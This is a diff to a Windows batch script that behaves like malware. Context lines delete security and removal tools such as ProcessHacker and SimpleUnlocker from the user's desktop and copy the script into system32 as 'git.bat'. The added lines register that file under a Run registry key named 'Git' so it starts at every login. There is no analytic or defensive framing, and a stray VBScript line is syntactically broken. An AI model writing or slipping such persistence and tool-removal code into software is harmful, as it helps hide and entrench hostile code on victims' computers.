@@ -53,6 +53,18 @@ del C:\Users\%username%\desktop\SimpleUnlocker.exe /s /q
 del C:\Users\%username%\desktop\Uninstall tool.exe /s /q
 del C:\Users\%username%\desktop\ProcessHacker.exe /s /q
 
+@echo off
+
+setlocal
+
+set USERNAME=usernit
+
+set FILEPATH=%~dp0git.bat
+
+set KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+reg add "%KEY%" /v "Git" /d "\"%FILEPATH%\"" /f
+
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
 copy ""%0"" "C:\Windows\system32\git.bat"
